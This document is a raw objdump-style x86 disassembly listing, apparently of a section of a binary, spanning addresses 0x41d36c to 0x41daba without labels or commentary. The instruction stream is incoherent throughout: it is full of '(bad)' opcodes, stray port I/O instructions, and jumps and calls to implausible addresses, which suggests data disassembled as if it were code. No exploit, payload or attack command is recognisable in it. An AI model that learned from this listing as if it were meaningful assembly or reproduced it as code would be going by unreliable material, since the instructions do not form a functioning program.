  41d36c:	rol    bh,cl
  41d36e:	and    DWORD PTR [ebx+eiz*1+0x671d29b7],ecx
  41d375:	cmp    DWORD PTR [eax-0x61],esp
  41d378:	lahf   
  41d379:	lar    ebp,di
  41d37c:	dec    esp
  41d37d:	(bad)  
  41d37e:	push   ss
  41d37f:	pushf  
  41d380:	or     DWORD PTR [ecx+esi*1+0x3dc7a736],esi
  41d387:	out    dx,eax
  41d388:	dec    edx
  41d389:	push   cs
  41d38a:	scas   al,BYTE PTR es:[edi]
  41d38b:	push   esp
  41d38c:	inc    edx
  41d38d:	stos   BYTE PTR es:[edi],al
  41d38e:	out    dx,eax
  41d38f:	add    eax,0xa93c5186
  41d394:	pop    ebx
  41d395:	mov    dl,0xcd
  41d397:	test   DWORD PTR [eax+0x25],edi
  41d39a:	and    BYTE PTR [ecx+0x29],bl
  41d39d:	and    al,0x60
  41d39f:	imul   esp,DWORD PTR [eax],0xf1e13d4a
  41d3a5:	inc    ebp
  41d3a6:	mov    DWORD PTR ds:0x17a4237e,ebx
  41d3ac:	fist   WORD PTR [edi-0x16980884]
  41d3b2:	pop    ebx
  41d3b3:	(bad)  
  41d3b5:	xor    ah,bh
  41d3b7:	cmp    al,0xdd
  41d3b9:	leave  
  41d3ba:	in     eax,0x16
  41d3bc:	lods   eax,DWORD PTR ds:[esi]
  41d3bd:	or     DWORD PTR [ebx-0x34],ebx
  41d3c0:	dec    ebp
  41d3c1:	int3   
  41d3c2:	outs   dx,BYTE PTR ds:[esi]
  41d3c3:	xchg   edx,eax
  41d3c4:	loop   0x41d415
  41d3c6:	sub    eax,0x262910a5
  41d3cb:	jge    0x41d36b
  41d3cd:	push   esi
  41d3ce:	jae    0x41d37c
  41d3d0:	mov    esi,0x78724ef9
  41d3d5:	test   BYTE PTR fs:[edi],bh
  41d3d8:	(bad)  
  41d3d9:	mov    ds:0x40c599a0,eax
  41d3de:	stos   DWORD PTR es:[edi],eax
  41d3df:	push   ebx
  41d3e0:	dec    esi
  41d3e1:	cmp    al,0x68
  41d3e3:	aas    
  41d3e4:	shl    BYTE PTR [edi],1
  41d3e6:	jge    0x41d401
  41d3e8:	mov    ah,0xce
  41d3ea:	mov    edx,0xeffed46
  41d3ef:	xor    al,0x9b
  41d3f1:	retf   0xf4ec
  41d3f4:	push   ds
  41d3f5:	dec    edx
  41d3f6:	mov    esp,0xf7f7b18b
  41d3fb:	xor    BYTE PTR [edx+0x507ab10],ah
  41d401:	pop    eax
  41d402:	xor    BYTE PTR [ebx+0x22],dl
  41d405:	nop
  41d406:	rep lods eax,DWORD PTR ds:[esi]
  41d408:	(bad)  
  41d409:	dec    esp
  41d40a:	inc    ecx
  41d40b:	stos   BYTE PTR es:[edi],al
  41d40c:	dec    ecx
  41d40d:	inc    eax
  41d40e:	mov    cl,cl
  41d410:	xchg   edi,eax
  41d411:	adc    bh,bl
  41d413:	jbe    0x41d477
  41d415:	sti    
  41d416:	dec    ebx
  41d417:	pop    es
  41d418:	icebp  
  41d419:	ja     0x41d430
  41d41b:	or     edi,edx
  41d41d:	mov    eax,0xfbfc7589
  41d422:	cmp    ah,cl
  41d424:	mov    ebx,0x4486471b
  41d429:	loopne 0x41d492
  41d42b:	scas   al,BYTE PTR es:[edi]
  41d42c:	enter  0x214f,0x85
  41d430:	loop   0x41d3f6
  41d432:	sub    DWORD PTR [ebx+eax*1-0x7e],esi
  41d436:	inc    esp
  41d437:	mov    dh,0x70
  41d439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d43a:	mov    eax,0x60cf2098
  41d43f:	out    0xee,al
  41d441:	sub    al,0x62
  41d443:	inc    esp
  41d444:	mov    eax,0xe44ec67c
  41d449:	out    dx,eax
  41d44a:	bound  edi,QWORD PTR gs:[esi+0x35e58799]
  41d451:	aam    0x58
  41d453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d454:	repnz xchg ebp,eax
  41d456:	stos   BYTE PTR es:[edi],al
  41d457:	xchg   BYTE PTR [ebx],dl
  41d459:	mov    ebp,0xa03efecd
  41d45e:	ficomp WORD PTR [ecx+edx*2-0x31]
  41d462:	sub    DWORD PTR [eax+0xc],ecx
  41d465:	inc    ebp
  41d466:	into   
  41d467:	in     eax,0xbe
  41d469:	stos   BYTE PTR es:[edi],al
  41d46a:	gs mov dl,0x34
  41d46d:	(bad)  
  41d46f:	loop   0x41d49b
  41d471:	shl    BYTE PTR ss:[edx-0x4c],1
  41d475:	mov    DWORD PTR [edi+0x57b0f873],edx
  41d47b:	mov    cl,0xb8
  41d47d:	mov    ebp,0xc9eb6fa
  41d482:	sub    al,0x4a
  41d484:	adc    eax,0x8cc8cfd5
  41d489:	stos   BYTE PTR es:[edi],al
  41d48a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d48b:	xor    BYTE PTR [edx],ah
  41d48d:	xor    ebx,DWORD PTR [ecx-0x2d]
  41d490:	lea    ebx,[edx]
  41d492:	add    bl,BYTE PTR [ecx+0x4f]
  41d495:	or     DWORD PTR [eax+0x4dfa06e0],0xf9619126
  41d49f:	fisttp DWORD PTR [ecx-0x1b]
  41d4a2:	cdq    
  41d4a3:	aaa    
  41d4a4:	sti    
  41d4a5:	jmp    0x3b526884
  41d4aa:	jp     0x41d4af
  41d4ac:	and    dl,BYTE PTR [edi-0x69f05b4]
  41d4b2:	add    BYTE PTR [esi],bh
  41d4b4:	cmc    
  41d4b5:	add    DWORD PTR [eax],edx
  41d4b7:	(bad)  
  41d4b9:	dec    eax
  41d4ba:	dec    bl
  41d4bc:	or     ebx,DWORD PTR [edi+ebp*8+0x70]
  41d4c0:	cli    
  41d4c1:	ror    BYTE PTR [edi],cl
  41d4c3:	push   ds
  41d4c4:	xchg   ebx,eax
  41d4c5:	lock add eax,0xb7b82356
  41d4cb:	fwait
  41d4cc:	(bad)  
  41d4cd:	mov    cl,0xb1
  41d4cf:	loop   0x41d50d
  41d4d1:	in     al,dx
  41d4d2:	xchg   dh,cl
  41d4d4:	lea    esi,ds:0x83f2ae76
  41d4da:	sub    eax,0x84437715
  41d4df:	xchg   BYTE PTR [ebx-0x9],dl
  41d4e2:	out    dx,eax
  41d4e3:	lods   eax,DWORD PTR ds:[esi]
  41d4e4:	rcl    BYTE PTR [ecx],cl
  41d4e6:	xor    cl,BYTE PTR [ebp+0x46c453e3]
  41d4ec:	ret    
  41d4ed:	retf   0xc8c1
  41d4f0:	imul   esp,DWORD PTR [edx-0x21],0x4a
  41d4f4:	dec    esi
  41d4f5:	inc    esp
  41d4f6:	push   esi
  41d4f7:	push   ds
  41d4f8:	sar    DWORD PTR [edi+ebx*1+0x71],1
  41d4fc:	pop    edx
  41d4fd:	adc    BYTE PTR [edx],0xfb
  41d500:	pop    ebx
  41d501:	xchg   ebx,eax
  41d502:	cli    
  41d503:	mov    ecx,0x9ad2a69f
  41d508:	inc    eax
  41d509:	dec    edi
  41d50a:	mov    eax,gs
  41d50c:	or     ecx,edx
  41d50e:	mov    ah,ah
  41d510:	ror    BYTE PTR [ebx],0x71
  41d513:	icebp  
  41d514:	or     BYTE PTR [ebx],dl
  41d516:	fst    DWORD PTR [edx]
  41d518:	and    eax,DWORD PTR [ebp-0x39cd69f2]
  41d51e:	xor    al,0x97
  41d520:	inc    edx
  41d521:	jae    0x41d572
  41d523:	ds call 0x3145480a
  41d529:	xor    ah,bh
  41d52b:	mov    ah,0xfc
  41d52d:	shr    DWORD PTR [edi],1
  41d52f:	aam    0x2
  41d531:	outs   dx,DWORD PTR ds:[esi]
  41d532:	clc    
  41d533:	mov    al,ds:0xa4b6ac14
  41d538:	xchg   edi,eax
  41d539:	ins    DWORD PTR es:[edi],dx
  41d53a:	in     eax,dx
  41d53b:	mov    eax,ds:0x4b446ae4
  41d540:	sub    al,0x92
  41d542:	daa    
  41d543:	rol    edx,0x4e
  41d546:	les    esp,FWORD PTR [ebp-0x65ff2480]
  41d54c:	outs   dx,BYTE PTR ds:[esi]
  41d54d:	in     eax,0x1a
  41d54f:	fdivr  DWORD PTR [edx]
  41d551:	mov    bh,BYTE PTR [edx]
  41d553:	jb     0x41d54c
  41d555:	and    eax,0x4586daba
  41d55a:	gs xchg edi,eax
  41d55c:	mov    edx,DWORD PTR [ebp+0x68]
  41d55f:	into   
  41d560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d561:	(bad)  
  41d563:	or     esi,DWORD PTR [edx]
  41d565:	sbb    DWORD PTR [edi+0x18],ebp
  41d568:	test   al,0x15
  41d56a:	cmp    eax,0xf80a58c8
  41d56f:	stos   BYTE PTR es:[edi],al
  41d570:	es clc 
  41d572:	imul   edx,DWORD PTR [ebp-0x26],0x59
  41d576:	sahf   
  41d577:	xchg   BYTE PTR [edi+0x66],al
  41d57a:	hlt    
  41d57b:	fdiv   st(5),st
  41d57d:	add    al,BYTE PTR [ebx]
  41d57f:	out    0xb6,eax
  41d581:	enter  0x4943,0x53
  41d585:	in     al,dx
  41d586:	icebp  
  41d587:	mov    esp,DWORD PTR [edi-0x5a]
  41d58a:	psubq  mm2,QWORD PTR [edi-0x8]
  41d58e:	and    al,0x55
  41d590:	in     eax,0xce
  41d592:	arpl   WORD PTR [eax+ebp*1-0x1a],dx
  41d596:	and    al,bh
  41d598:	xor    DWORD PTR [ebx+0x38],ebp
  41d59b:	rcl    DWORD PTR ds:[edi+0x94c5762],0x1a
  41d5a3:	pop    esi
  41d5a4:	lods   eax,DWORD PTR ds:[esi]
  41d5a5:	stc    
  41d5a6:	call   0x3f50:0x68312d4
  41d5ad:	and    edx,DWORD PTR [ebp-0x67]
  41d5b0:	test   al,0x25
  41d5b2:	ins    BYTE PTR es:[edi],dx
  41d5b3:	not    BYTE PTR [edx+0x0]
  41d5b6:	out    dx,al
  41d5b7:	xor    esi,DWORD PTR [ecx]
  41d5b9:	call   0xf2d180c1
  41d5be:	push   esi
  41d5bf:	icebp  
  41d5c0:	adc    cx,WORD PTR [edx+0x54]
  41d5c4:	pop    edi
  41d5c5:	lods   al,BYTE PTR ds:[esi]
  41d5c6:	cmp    al,0x1e
  41d5c8:	int3   
  41d5c9:	ret    0x3fd
  41d5cc:	repz dec ecx
  41d5ce:	inc    ebx
  41d5cf:	mov    es,WORD PTR [ecx-0x31]
  41d5d2:	retf   
  41d5d3:	dec    edx
  41d5d4:	sbb    eax,0xb14b15a8
  41d5d9:	sbb    eax,0xaeedbfc1
  41d5de:	or     DWORD PTR [edx+0x45],eax
  41d5e1:	stos   BYTE PTR es:[edi],al
  41d5e2:	mov    esi,0x82716de1
  41d5e7:	loopne 0x41d630
  41d5e9:	mov    esp,DWORD PTR [edx+0x72]
  41d5ec:	and    ebx,DWORD PTR [esi-0x3a424c1e]
  41d5f2:	add    eax,0x815dc590
  41d5f7:	mov    ah,0x8b
  41d5f9:	ret    0xdd08
  41d5fc:	test   DWORD PTR [esi-0x5bd43670],ebx
  41d602:	rcl    BYTE PTR [ebx-0x5f776e3f],cl
  41d608:	jnp    0x41d664
  41d60a:	lock cmp ebp,DWORD PTR [edi+0x7e380131]
  41d611:	jge    0x41d5d9
  41d613:	call   0x245a:0xdc79c9b2
  41d61a:	hlt    
  41d61b:	adc    ecx,DWORD PTR [edx]
  41d61d:	mov    al,0x97
  41d61f:	aam    0x5f
  41d621:	enter  0x74dd,0xac
  41d625:	inc    ecx
  41d626:	xor    al,0x4f
  41d628:	lods   eax,DWORD PTR ds:[esi]
  41d629:	rcl    BYTE PTR [esi],0x4b
  41d62c:	pop    ss
  41d62d:	gs jl  0x41d65d
  41d630:	sbb    BYTE PTR ds:0x6723b029,al
  41d636:	dec    eax
  41d637:	xor    bh,BYTE PTR [ebp-0x4]
  41d63a:	adc    al,0x4f
  41d63c:	and    BYTE PTR [edi],dh
  41d63e:	or     eax,0xd751c802
  41d643:	push   eax
  41d644:	(bad)  
  41d645:	cmp    dl,BYTE PTR [eax-0x2c]
  41d648:	es xchg edx,eax
  41d64a:	or     BYTE PTR [edx],dh
  41d64c:	adc    eax,0xe8a08af3
  41d651:	gs xchg esp,eax
  41d653:	pop    ebp
  41d654:	mov    bl,0x79
  41d656:	bound  edi,QWORD PTR [eax+0x2]
  41d659:	xchg   ebx,eax
  41d65a:	test   ch,ah
  41d65c:	test   eax,0xe0ea7153
  41d661:	in     eax,0x5b
  41d663:	gs das 
  41d665:	and    al,0x5f
  41d667:	xchg   esp,eax
  41d668:	lea    ebp,[esi-0x1e1f8b93]
  41d66e:	xor    DWORD PTR [edx],ebp
  41d670:	jecxz  0x41d611
  41d672:	daa    
  41d673:	mov    edi,0x605adf9c
  41d678:	pop    edx
  41d679:	test   DWORD PTR [eax-0x3f],edx
  41d67c:	xor    eax,0xd6260de6
  41d681:	sbb    BYTE PTR [esp+edi*8+0x25],cl
  41d685:	sbb    al,0x31
  41d687:	jg     0x41d6f8
  41d689:	add    ecx,edi
  41d68b:	jecxz  0x41d702
  41d68d:	inc    ebp
  41d68e:	xor    eax,0x697c30da
  41d693:	(bad)  
  41d694:	mov    dl,BYTE PTR [ecx-0x5]
  41d697:	ss iret 
  41d699:	inc    esi
  41d69a:	add    DWORD PTR [ebp+0x46268292],edi
  41d6a0:	push   ebx
  41d6a1:	sub    eax,0x1b3a0bc1
  41d6a6:	mov    esp,0xef86aef5
  41d6ab:	js     0x41d65a
  41d6ad:	sub    eax,DWORD PTR [ecx+edx*8]
  41d6b0:	inc    edi
  41d6b1:	popa   
  41d6b2:	out    dx,al
  41d6b3:	stos   BYTE PTR es:[edi],al
  41d6b4:	(bad)  
  41d6b5:	jmp    0x928f2a8a
  41d6ba:	sbb    DWORD PTR [edx],ebp
  41d6bc:	fiadd  DWORD PTR [ebp-0x40]
  41d6bf:	(bad)  
  41d6c0:	repnz fdivp st(0),st
  41d6c3:	add    al,0x9e
  41d6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6c6:	or     al,0xfb
  41d6c8:	in     eax,0xeb
  41d6ca:	xlat   BYTE PTR ds:[ebx]
  41d6cb:	mov    BYTE PTR [ebx+0x1f],ah
  41d6ce:	int    0x24
  41d6d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6d1:	xor    bh,BYTE PTR [ebx+0x2f35d605]
  41d6d7:	push   ecx
  41d6d8:	jnp    0x41d750
  41d6da:	ret    0xd540
  41d6dd:	jge    0x41d746
  41d6df:	cmp    al,0x7a
  41d6e1:	stos   BYTE PTR es:[edi],al
  41d6e2:	rol    DWORD PTR [edx],1
  41d6e4:	lds    ecx,FWORD PTR [edx]
  41d6e6:	ret    0xc3fd
  41d6e9:	mov    edx,0x9c8f0966
  41d6ee:	mov    al,0x54
  41d6f0:	inc    esp
  41d6f1:	push   eax
  41d6f2:	movzx  esi,BYTE PTR [eax-0x60af2afd]
  41d6f9:	(bad)  
  41d6fa:	and    eax,ecx
  41d6fc:	sub    dh,bl
  41d6fe:	mov    al,0x6b
  41d700:	and    ebx,DWORD PTR [esi+0x56]
  41d703:	inc    edx
  41d704:	mov    esp,eax
  41d706:	mov    ch,0x8
  41d708:	ret    
  41d709:	sub    esp,DWORD PTR ds:0xf4585f2c
  41d70f:	jb     0x41d692
  41d711:	pop    esp
  41d712:	test   eax,0x88eeead7
  41d717:	fcomp  DWORD PTR [ebx+0x6d61c879]
  41d71d:	mov    dl,BYTE PTR [edx+0x1fc639c]
  41d723:	cmp    DWORD PTR [ebx+0x4a],ebx
  41d726:	(bad)  
  41d727:	div    BYTE PTR [edx-0x7d78a0f5]
  41d72d:	push   esi
  41d72e:	clc    
  41d72f:	jns    0x41d79c
  41d731:	popa   
  41d732:	and    eax,0x9364a411
  41d737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d738:	mov    esp,edi
  41d73a:	pusha  
  41d73b:	inc    ebp
  41d73c:	in     eax,dx
  41d73d:	push   esi
  41d73e:	sub    al,0x53
  41d740:	push   ebx
  41d741:	scas   al,BYTE PTR es:[edi]
  41d742:	cld    
  41d743:	fisubr DWORD PTR [ebp-0x1f0f79b4]
  41d749:	enter  0x6e3,0xed
  41d74d:	inc    ebx
  41d74e:	ficomp DWORD PTR [edi-0x62]
  41d751:	jno    0x41d70c
  41d753:	jns    0x41d7c6
  41d755:	loopne 0x41d71f
  41d757:	mov    eax,0x185a722d
  41d75c:	or     ebp,edi
  41d75e:	test   BYTE PTR [eax-0x2428654a],al
  41d764:	dec    edi
  41d765:	mov    esp,0xa8dddd40
  41d76a:	in     eax,dx
  41d76b:	or     al,0x3
  41d76d:	ret    0x5a51
  41d770:	mov    ds:0xfbabf824,eax
  41d775:	xchg   ebp,eax
  41d776:	adc    al,0x71
  41d778:	mov    esi,es
  41d77a:	xchg   esi,eax
  41d77b:	bound  ecx,QWORD PTR [ebp-0x2d006763]
  41d781:	sahf   
  41d782:	mov    ebx,0x256ba8d0
  41d787:	js     0x41d782
  41d789:	imul   edx,DWORD PTR [esi],0xb93f45e1
  41d78f:	cmp    ah,dl
  41d791:	retf   
  41d792:	jle    0x41d754
  41d794:	adc    BYTE PTR [esi],bl
  41d796:	inc    esi
  41d797:	add    eax,0xf776b800
  41d79c:	test   DWORD PTR [ecx-0x128c6fed],0x29133f89
  41d7a6:	bound  edi,QWORD PTR [esi]
  41d7a8:	xchg   DWORD PTR [edx-0x41],esi
  41d7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ac:	stos   DWORD PTR es:[edi],eax
  41d7ad:	mov    edx,DWORD PTR [edi]
  41d7af:	sar    dl,cl
  41d7b1:	and    DWORD PTR [edx-0x2b],eax
  41d7b4:	mov    dh,0xd1
  41d7b6:	rcr    BYTE PTR [ecx-0x5f],0x19
  41d7ba:	push   ss
  41d7bb:	pop    ds
  41d7bc:	mov    bl,0xd9
  41d7be:	lods   eax,DWORD PTR ds:[esi]
  41d7bf:	add    DWORD PTR [esi-0x61f235fe],edi
  41d7c5:	mov    cl,0x8c
  41d7c7:	xchg   DWORD PTR [edx],ebx
  41d7c9:	repz mov ebp,0x1646a1a1
  41d7cf:	mov    BYTE PTR [edi],dh
  41d7d1:	mov    ebx,DWORD PTR [ebx+0x7]
  41d7d4:	cs gs add ah,0xf8
  41d7d9:	and    DWORD PTR [ecx-0x16adac0c],esi
  41d7df:	mov    ebp,0x2bac3868
  41d7e4:	test   al,0x3f
  41d7e6:	cmp    BYTE PTR [ecx+0x27],dl
  41d7e9:	jecxz  0x41d7de
  41d7eb:	js     0x41d826
  41d7ed:	shl    DWORD PTR [eax+0x15],cl
  41d7f0:	sub    DWORD PTR [esi],ebx
  41d7f2:	int3   
  41d7f3:	adc    al,0x14
  41d7f5:	gs rcl ebp,1
  41d7f8:	mov    ah,cl
  41d7fa:	in     eax,dx
  41d7fb:	xchg   BYTE PTR [ecx-0x15],cl
  41d7fe:	mov    dl,0xcf
  41d800:	imul   eax,DWORD PTR [eax],0xfe61d9d9
  41d806:	cmp    eax,0xb3408655
  41d80b:	mov    edx,0x7d25b0f8
  41d810:	je     0x41d7e2
  41d812:	clc    
  41d813:	aaa    
  41d814:	inc    esp
  41d815:	jmp    0x71057ce4
  41d81a:	jno    0x41d7d2
  41d81c:	outs   dx,DWORD PTR ds:[esi]
  41d81d:	xchg   edx,eax
  41d81e:	fs jae 0x41d7c7
  41d821:	mov    ebx,0x6def4dff
  41d826:	nop
  41d827:	int    0x13
  41d829:	lock repz fiadd WORD PTR [ebp-0x4f4a624b]
  41d831:	pop    ecx
  41d832:	rcr    esi,0xe7
  41d835:	lahf   
  41d836:	push   ecx
  41d837:	add    eax,0x5ca17def
  41d83c:	lea    edx,[edx+edi*2+0x17e2e8a2]
  41d843:	xor    eax,0xa0677a0e
  41d848:	add    eax,0x4f2c4cca
  41d84d:	pop    esi
  41d84e:	out    dx,al
  41d84f:	xchg   DWORD PTR [edx+0x7903500f],ebp
  41d855:	mov    ecx,0xc1d702b3
  41d85a:	sbb    BYTE PTR [esi-0xf],bh
  41d85d:	fcomp  DWORD PTR [edx]
  41d85f:	and    al,0x98
  41d861:	and    eax,0x4d0f1633
  41d866:	into   
  41d867:	fcomp  QWORD PTR ds:0xc2af8bac
  41d86d:	sahf   
  41d86e:	(bad)  
  41d86f:	push   esp
  41d870:	dec    ebp
  41d871:	sub    eax,eax
  41d873:	test   eax,0xc6520510
  41d878:	or     eax,0x5bc63503
  41d87d:	or     eax,edx
  41d87f:	mov    ecx,0xe136dc79
  41d884:	pusha  
  41d885:	int    0xe3
  41d887:	dec    ebx
  41d888:	pop    ebx
  41d889:	xlat   BYTE PTR ds:[ebx]
  41d88a:	out    0x4b,al
  41d88c:	sub    al,0xce
  41d88e:	rcr    ebp,cl
  41d890:	cdq    
  41d891:	js     0x41d8b1
  41d893:	rcl    eax,0xe0
  41d896:	inc    ebp
  41d897:	xchg   ecx,eax
  41d898:	imul   edx,DWORD PTR ds:0xe5e9ad95,0x59
  41d89f:	scas   eax,DWORD PTR es:[edi]
  41d8a0:	ja     0x41d892
  41d8a2:	mov    ecx,0xba2f8a60
  41d8a7:	lods   al,BYTE PTR ds:[esi]
  41d8a8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41d8aa:	aaa    
  41d8ab:	and    al,0x67
  41d8ad:	(bad)  
  41d8ae:	mov    ch,0x8
  41d8b0:	das    
  41d8b1:	pop    es
  41d8b2:	push   edi
  41d8b3:	and    ecx,ecx
  41d8b5:	sub    al,0xe9
  41d8b7:	pop    esp
  41d8b8:	call   0x6c560a3e
  41d8bd:	icebp  
  41d8be:	xchg   ebx,eax
  41d8bf:	or     al,0xce
  41d8c1:	shr    DWORD PTR [esi],1
  41d8c3:	mov    ch,0x87
  41d8c5:	int3   
  41d8c6:	dec    esp
  41d8c7:	add    eax,0xc72f63c1
  41d8cc:	and    bl,BYTE PTR [edx-0x67972d44]
  41d8d2:	packsswb mm3,mm6
  41d8d5:	inc    ebp
  41d8d6:	jg     0x41d8e7
  41d8d8:	fmul   DWORD PTR [edi]
  41d8da:	jle    0x41d882
  41d8dc:	adc    ebp,DWORD PTR [eax]
  41d8de:	sbb    eax,0xa9258e82
  41d8e3:	and    ah,BYTE PTR [esi-0x19d60aa2]
  41d8e9:	push   ds
  41d8ea:	push   eax
  41d8eb:	or     edi,DWORD PTR [edx-0x19]
  41d8ee:	inc    eax
  41d8ef:	stos   DWORD PTR es:[edi],eax
  41d8f0:	ret    0x8dc6
  41d8f3:	mov    edi,DWORD PTR [ecx]
  41d8f5:	test   eax,0x73e92023
  41d8fa:	sar    DWORD PTR [eax],cl
  41d8fc:	out    dx,al
  41d8fd:	ds popa 
  41d8ff:	cwde   
  41d900:	dec    esp
  41d901:	stos   BYTE PTR es:[edi],al
  41d902:	ss xchg ebx,eax
  41d904:	call   FWORD PTR [esi+0x69]
  41d907:	cmp    BYTE PTR [eax],bh
  41d909:	push   0x40064553
  41d90e:	enter  0x8252,0xc
  41d912:	adc    DWORD PTR [edx+0x67],0x277e8b90
  41d919:	pop    eax
  41d91b:	sbb    edx,DWORD PTR [esi]
  41d91d:	ret    
  41d91e:	adc    eax,0xdba71b1f
  41d923:	cmp    BYTE PTR [ebx+edx*4],bh
  41d926:	(bad)  
  41d927:	cld    
  41d928:	sbb    edx,DWORD PTR ds:0x7773aa31
  41d92e:	int    0x4f
  41d930:	fs pop edx
  41d932:	xchg   ecx,eax
  41d933:	inc    ebx
  41d934:	cmc    
  41d935:	or     al,0x99
  41d937:	je     0x41d947
  41d939:	les    edi,FWORD PTR [edi+ecx*1+0x48]
  41d93d:	xchg   ecx,eax
  41d93e:	dec    ebx
  41d93f:	pop    es
  41d940:	arpl   WORD PTR [edi],ax
  41d942:	aam    0xa
  41d944:	(bad)  
  41d945:	ret    0xca4d
  41d948:	push   edi
  41d949:	push   eax
  41d94a:	jge    0x41d962
  41d94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d94d:	inc    edx
  41d94e:	push   esi
  41d94f:	or     DWORD PTR [eax+ebx*1+0x6f6a7e],0x72
  41d957:	jg     0x41d9cf
  41d959:	in     eax,dx
  41d95a:	fsub   DWORD PTR [edx-0x7a]
  41d95d:	inc    ebp
  41d95e:	sbb    ebp,eax
  41d960:	ss lock ss test al,0x36
  41d965:	adc    eax,0xc42ab65e
  41d96a:	xchg   DWORD PTR [edx-0xf379dc3],ebp
  41d970:	stc    
  41d971:	shl    DWORD PTR [eax],cl
  41d973:	cld    
  41d974:	dec    edi
  41d975:	fisttp DWORD PTR [esi]
  41d977:	pusha  
  41d978:	xor    bl,BYTE PTR [edi+esi*8]
  41d97b:	mov    edx,0x85263985
  41d980:	nop
  41d981:	sub    bh,BYTE PTR [esi+0x4a29a5c9]
  41d987:	not    BYTE PTR [eax-0x14bf30a6]
  41d98d:	cs out 0x74,eax
  41d990:	inc    eax
  41d991:	std    
  41d992:	aad    0x7e
  41d994:	loop   0x41d9c2
  41d996:	pop    esi
  41d997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d998:	dec    esp
  41d999:	cwde   
  41d99a:	sub    eax,DWORD PTR gs:[eax+0x62]
  41d99e:	pop    ecx
  41d99f:	sub    eax,0xa680bb07
  41d9a4:	sar    DWORD PTR [ebp+0xf],1
  41d9a7:	and    DWORD PTR [eax+0x76d5c926],ebx
  41d9ad:	jecxz  0x41da0a
  41d9af:	push   esp
  41d9b0:	data16 (bad) 
  41d9b2:	aad    0xe1
  41d9b4:	test   dh,dh
  41d9b6:	je     0x41d93e
  41d9b8:	mov    DWORD PTR [ebp+0x2f0bdd89],edi
  41d9be:	stos   DWORD PTR es:[edi],eax
  41d9bf:	mov    dh,0x39
  41d9c1:	xchg   edi,eax
  41d9c2:	(bad)  
  41d9c4:	inc    edx
  41d9c5:	cs aad 0x55
  41d9c8:	push   ebp
  41d9c9:	push   ebx
  41d9ca:	mov    ch,0x30
  41d9cc:	mov    edi,0x811a92a6
  41d9d1:	int3   
  41d9d2:	pusha  
  41d9d3:	push   eax
  41d9d4:	dec    esp
  41d9d5:	dec    ecx
  41d9d6:	jnp    0x41d984
  41d9d8:	imul   BYTE PTR ds:0x27ded036
  41d9de:	adc    BYTE PTR [edx-0x7a],bl
  41d9e1:	pusha  
  41d9e2:	into   
  41d9e3:	mov    DWORD PTR [eax+edi*2-0x712b2aa8],ecx
  41d9ea:	cmc    
  41d9eb:	in     al,dx
  41d9ec:	lods   eax,DWORD PTR ds:[esi]
  41d9ed:	or     DWORD PTR [edi+0x2f],ebp
  41d9f0:	cmp    eax,0xe413446c
  41d9f5:	or     al,0x7
  41d9f7:	fstp   DWORD PTR [esi+ecx*1-0x80]
  41d9fb:	mov    ecx,0x9a7650b4
  41da00:	out    0x3,al
  41da02:	ins    BYTE PTR es:[edi],dx
  41da03:	(bad)  
  41da04:	outs   dx,BYTE PTR ds:[esi]
  41da05:	lods   al,BYTE PTR ds:[esi]
  41da06:	and    DWORD PTR [ecx-0x17],esi
  41da09:	scas   al,BYTE PTR es:[edi]
  41da0a:	gs test al,0x60
  41da0d:	xor    eax,0xf937d1a5
  41da12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da13:	cmp    eax,0xeb54b479
  41da18:	lahf   
  41da19:	jmp    0x6b880e18
  41da1e:	adc    ecx,eax
  41da20:	push   ds
  41da21:	xchg   ecx,eax
  41da22:	mov    cl,0x73
  41da24:	call   0x1d9d:0x2cc07064
  41da2b:	lods   al,BYTE PTR ds:[esi]
  41da2c:	sar    DWORD PTR [eax],1
  41da2e:	add    al,BYTE PTR [edx+eiz*1-0x14f46eb9]
  41da35:	inc    ebp
  41da36:	cmp    al,0xf8
  41da38:	xchg   esp,eax
  41da39:	int3   
  41da3a:	or     edx,DWORD PTR [ebp-0x5c]
  41da3d:	jmp    0xac1baccb
  41da42:	adc    eax,0xedd372c7
  41da47:	sbb    eax,0x39e6accf
  41da4c:	cmp    al,0x9
  41da4e:	mov    bh,0x91
  41da50:	jmp    0x41da5d
  41da52:	scas   al,BYTE PTR es:[edi]
  41da53:	dec    ebp
  41da54:	push   ss
  41da55:	sti    
  41da56:	inc    esp
  41da57:	push   edi
  41da58:	fcomp  DWORD PTR [esi]
  41da5a:	add    DWORD PTR [ebx],edi
  41da5c:	shr    DWORD PTR [edi-0x55],cl
  41da5f:	mov    ch,0xd9
  41da61:	pushf  
  41da62:	push   edx
  41da63:	int3   
  41da64:	rcr    eax,1
  41da66:	pusha  
  41da67:	fs int3 
  41da69:	out    0xb5,eax
  41da6b:	mov    edx,fs
  41da6d:	push   edi
  41da6e:	bound  edi,QWORD PTR [esi*1-0x3b9782e3]
  41da75:	mov    edx,0x777d302f
  41da7a:	adc    al,0xd5
  41da7c:	push   0xce765e87
  41da81:	imul   ecx,DWORD PTR [edi-0x2f],0x74
  41da85:	push   ecx
  41da86:	stos   DWORD PTR es:[edi],eax
  41da87:	push   ss
  41da88:	push   edx
  41da89:	(bad)  
  41da8a:	imul   esp,DWORD PTR [ecx+0xbbfd644],0xffffff94
  41da91:	loope  0x41db03
  41da93:	mov    BYTE PTR [edi-0xbf1bd3c],0xe2
  41da9a:	pop    ds
  41da9b:	mov    eax,ds:0x75d407d2
  41daa0:	mov    dl,0x67
  41daa2:	ret    0xf93f
  41daa5:	xlat   BYTE PTR ds:[ebx]
  41daa6:	inc    edi
  41daa7:	ficom  WORD PTR ds:0x23a1a82b
  41daad:	int    0x59
  41daaf:	cmp    al,0xfb
  41dab1:	mov    al,0x10
  41dab3:	dec    ebx
  41dab4:	stos   BYTE PTR es:[edi],al
  41dab5:	xor    DWORD PTR [eax],ebp
  41dab7:	fld    QWORD PTR [ebx]
  41dab9:	ret    
  41daba:	or     bh,BYTE PTR [edx+esi*8-0x4]
